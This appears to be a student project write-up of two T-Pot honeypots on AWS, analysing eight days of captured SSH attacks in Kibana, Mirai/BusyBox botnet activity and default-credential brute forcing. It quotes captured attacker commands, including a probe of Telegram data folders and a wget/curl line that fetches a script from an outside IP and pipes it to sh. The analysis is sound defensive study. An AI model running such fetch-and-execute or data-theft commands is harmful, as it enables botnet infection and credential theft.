

## T-Pot Honeypot Analysis Real World Cyber Attacks
## Project Overview
Deployed two T-Pot Community Edition honeypot instances on AWS to capture and analyze
real world cyber attacks over an 8-day period.
What is T-Pot? T-Pot is a multi honeypot platform that runs several honeypots simultaneously
including Cowrie (SSH/Telnet), Dionaea (malware capture), and others, with
Elasticsearch/Kibana for log analysis and visualization.
[Used Tpotce Repo from telekom-security](https://github.com/telekom-security/tpotce)
## Deployment:

**Instances:** 2 AWS EC2 honeypots

**Instance 1:** Tel Aviv, Israel (`51.16.10.89:64297`) ~2 million events

**Instance 2:** California, USA (`54.153.108.147:64297`) ~200,000 events

**Attack Sources:** Global attacks from France, Germany, China, Ecuador, and dozens of other countries

## Prerequisites:
AWS Account with credits
## Deployment Steps:
Step 1) Launch EC2 Instance
<img width="1603" height="853" alt="image17" src="https://github.com/user-attachments/assets/18f01b6f-ab12-4310-b745-41e6a9fbe687" />

<img width="1920" height="1200" alt="image1" src="https://github.com/user-attachments/assets/902e3a2f-14e0-4444-bab1-2fc8415ec2e3" />




Step 2) Access Instance and Set Up T-Pot

Step 3) Update Security Groups in AWS
<img width="1913" height="966" alt="image8" src="https://github.com/user-attachments/assets/69411d87-7b98-47c3-b377-e887fa21d214" />

<img width="1916" height="788" alt="image6" src="https://github.com/user-attachments/assets/e0b506ed-dce3-4727-85b2-c7f582e118c5" />


Step 4) Wait and analyze the logs


<img width="1914" height="930" alt="image3" src="https://github.com/user-attachments/assets/3f1845d7-1990-4aae-a25e-a2fe786bb289" />







## Analysis
## Honeypot Overview
Both instances received similar attack patterns across all T-Pot honeypots:
51.16.10.89:64297 (Tel Aviv) [dashboard screenshot showing 2m events, breakdown by
honeypot type]
54.153.108.147:64297 (California) [dashboard screenshot showing 155k-200k events,
breakdown by honeypot type]





## 51.16.10.89:64297
<img width="1899" height="812" alt="image9" src="https://github.com/user-attachments/assets/8aef1ca1-fad5-4a32-9d33-6c09f46ce3d6" />





## 54.153.108.147:64297
<img width="1898" height="817" alt="image7" src="https://github.com/user-attachments/assets/085f39c1-15c2-4264-8367-f3e035e7eb3c" />


<img width="758" height="333" alt="image11" src="https://github.com/user-attachments/assets/c645af6f-292f-4b44-aa65-234671b93d7a" />


To view more that the top 10 Cowrie commands imputed...

<img width="1905" height="697" alt="image15" src="https://github.com/user-attachments/assets/a654f8f2-0449-429f-9990-b097a73852fe" />

<img width="492" height="801" alt="image13" src="https://github.com/user-attachments/assets/422c6259-7134-4c59-b5f3-dc801d129008" />






Seems like both machines on the cowrie pot are getting similar commands being run
<img width="1120" height="798" alt="image14" src="https://github.com/user-attachments/assets/41ee2f13-ae09-497f-b2c9-db6bc5972d41" />

<img width="1117" height="757" alt="image18" src="https://github.com/user-attachments/assets/ff858fde-779d-46dc-8298-e0dcc1cd27f7" />

## Interesting Commands Found
Both honeypots running Cowrie received nearly identical malicious commands, indicating
automated global botnet campaigns:
## 1. Telegram Cryptocurrency Theft Attempt:
bash
ls -la ~/./.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata
Attackers trying to steal Telegram data where users often store cryptocurrency wallet seeds,
private keys, and exchange API credentials in "Saved Messages."
## 2. Malware Payload Execution:
bash
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s

Three fallback methods to read/execute a hidden malware file

● First tries
dd
to read exactly 52 bytes (likely a malware header/key)

● Falls back to
cat
if dd fails

● Finally reads line by line if both fail (works in restricted shells that disable
cat

This sophistication shows professional malware design with multiple compatibility layers.


## Deep Dive: Attack Chain Analysis
To view detailed attack chains in Kibana, navigate to the hamburger menu → Logs under
Observability and filter by
type.keyword: Cowrie

You can filter by specific source IP to see the full command sequence an attacker sent:

<img width="1484" height="645" alt="image5" src="https://github.com/user-attachments/assets/f9ac13f9-4764-4539-b5a6-063072babb0b" />
<img width="1595" height="217" alt="image12" src="https://github.com/user-attachments/assets/6ebb8659-46ed-49d8-bcfe-16945a50c859" />

Example Attack Chain from IP 186.42.215.82 (Ecuador):
bash
(wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) |
sh -s apache.selfrep






After exporting and analyzing this attack, I discovered:

● The payload was base64 encoded

● Attackers scan for vulnerable IoT/embedded Linux devices

● They bruteforce default credentials (root:admin, root:12345, etc.)

● Then download and execute malware directly in memory



<img width="1871" height="795" alt="image16" src="https://github.com/user-attachments/assets/b291d22d-f569-4643-acc9-99f0a910c1ec" />
<img width="996" height="781" alt="image2" src="https://github.com/user-attachments/assets/4b94c998-abfd-40e8-a030-46a6069e12fb" />



Threat Intelligence: VirusTotal Analysis
Using virustotal.com, I checked the attacker's IP: 186.42.215.82
Result: Malicious Flagged by multiple security vendors
<img width="1354" height="605" alt="image10" src="https://github.com/user-attachments/assets/ddddc61b-2414-4185-a00f-46c113d36819" />



Shocker, malicous

What is BusyBox?
Something that caught my eye in the decoded payload was BusyBox, I had never heard of it
before. After research 
BusyBox is a tiny Swiss Army knife of Linux commands bundled into one small program,
designed for embedded devices like routers and cameras that have limited storage space.
Why attackers love it:

● Already installed on millions of IoT devices

● Provides complete toolkit (wget, tftp, shell commands)

● Used to download malware, spread to other devices, and recruit them into botnets for
DDoS attacks

In this attack: The attacker tried to use BusyBox variant "CYNVB" to infect what they thought
was a vulnerable router or camera, attempting to add it to their Mirai botnet.
Mirai (from the Japanese word for "future", 未来) is malware that turns networked
devices running Linux into remotely controlled bots that can be used as part of a
botnet in large scale network attacks. (Wikipedia)
Global reach: Many other IP addresses from all over the world also attempted to use BusyBox
variants; this was just one attack chain I analyzed in depth.



There were many other IP addresses from all over the world that also tried using Busy Box; this
was just one attack chain that I went in depth into.

## Conclusions
## Key Findings
Over 8 days, my two T-Pot honeypots captured real world cyber attack patterns:
- Attacks are immediate and global, within hours of deployment, received attacks from
dozens of countries worldwide
- Cryptocurrency is a major target, multiple attempts to steal Telegram wallet data
shows crypto theft is a primary motivation
- IoT devices are prime targets for Mirai botnet variants actively recruiting vulnerable
routers, cameras, and embedded systems
- Attacks are sophisticated and automated there are multi-fallback execution methods, base64
encoding, and in-memory execution show professional development, but execution is
fully automated
- Default credentials are the entry point that attackers systematically test common
username/password combinations (root:admin, root:12345, admin:admin)
## What I Learned
## Technical Skills:

● T-Pot deployment and configuration, set up multi-honeypot platform on AWS EC2
with proper security groups and network configuration

● Kibana/Elasticsearch, used Kibana's Discover interface to filter, search, and analyze
millions of log events; created visualizations to identify attack patterns

● Log analysis techniques, filtered by event types, source IPs, and command patterns
to trace complete attack chains

● Base64 decoding and payload analysis, decoded obfuscated malware to understand
attacker techniques and malware functionality

● Threat intelligence tools, leveraged VirusTotal to validate malicious IPs and
understand attacker infrastructure

## Security Insights:

● Real production servers with default credentials would be compromised within
hours

● Attackers use legitimate cloud infrastructure (AWS, OVH, Hetzner) for attack
operations

● BusyBox is weaponized across millions of IoT devices globally

● Honeypots provide invaluable threat intelligence without putting real systems at risk

● Modern botnets are global, coordinated operations with sophisticated malware

Key Takeaway: Deploying and analyzing a honeypot provided hands-on experience with
real-world attack patterns and taught me practical cybersecurity skills in log analysis, threat
intelligence, and understanding attacker tactics, techniques, and procedures (TTPs).

Real-World Impact
If these were real vulnerable systems instead of honeypots:

● Both would have been compromised immediately

● Recruited into DDoS botnets (Mirai variants)

● Used to scan and infect other devices

The lesson: Always change default credentials, keep systems patched, and assume you're
being scanned 24/7.



Ps: users and passwords used on the instance



<img width="1889" height="394" alt="image4" src="https://github.com/user-attachments/assets/a925a51f-965c-4c72-b2f6-18b87ffab355" />






